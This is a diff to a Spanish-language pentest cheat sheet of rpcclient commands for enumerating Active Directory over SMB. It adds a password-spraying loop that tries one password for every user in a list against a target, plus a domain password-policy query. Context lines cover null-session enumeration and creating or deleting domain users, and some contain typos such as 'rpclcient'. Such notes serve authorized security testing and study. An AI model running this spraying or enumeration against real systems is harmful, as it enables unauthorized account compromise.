@@ -15,6 +15,11 @@ rpcclient -U "gest%" <IP-TARGET> -N
 rpcclient -U "<USERNAME>%<PASSWORD>" <IP-TARGET> -N
 ```
 
+#### Password Spraying - Conocer a través de una lista de usuarios cuales tienen acceso con una contraseña dada
+```
+for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <IP-TARGET> | grep Authority; done
+```
+
 #### Enumerar los Dominios
 ```
 rpclcient -U "<USERNAME>%<PASSWORD>" <IP-TARGET> -c "enumdomains"
@@ -50,6 +55,11 @@ rpcclient -U "<USERNAME>%<PASSWORD>" <IP-TARGET> -c 'queryuser 0x1f4'
 rpcclient -U "<USERNAME>%<PASSWORD>" <IP-TARGET> -c 'querydispinfo'
 ```
 
+#### Mostrar la Politica de Contraseñas
+```
+rpcclient -U "<USERNAME>%<PASSWORD>" <IP-TARGET> -c 'getdompwinfo'
+```
+
 #### Crear un usuario del AD (Teniendo los privilegios necesarios)
 ```
 rpclient -U "<USERNAME>%<PASSWORD>" <IP-TARGET>
@@ -82,7 +92,7 @@ rpcclient -U "<USERNAME>%<PASSWORD>" <IP-TARGET> -c 'deletedomgroup <GROUP>'
 ```
 rpcclient -U "gest%" <IP-TARGET> -c 'lookupnames <USERNAME>'
 
-rpcclient -U "gest%" <IP-TARGET> -c 'lookupnames administrator'
+rpcclient -U "gest%" <IP-TARGET> -c 'lookupnames Administrator'
 ```
 
 #### Saber el usuario proporcionando el SID 
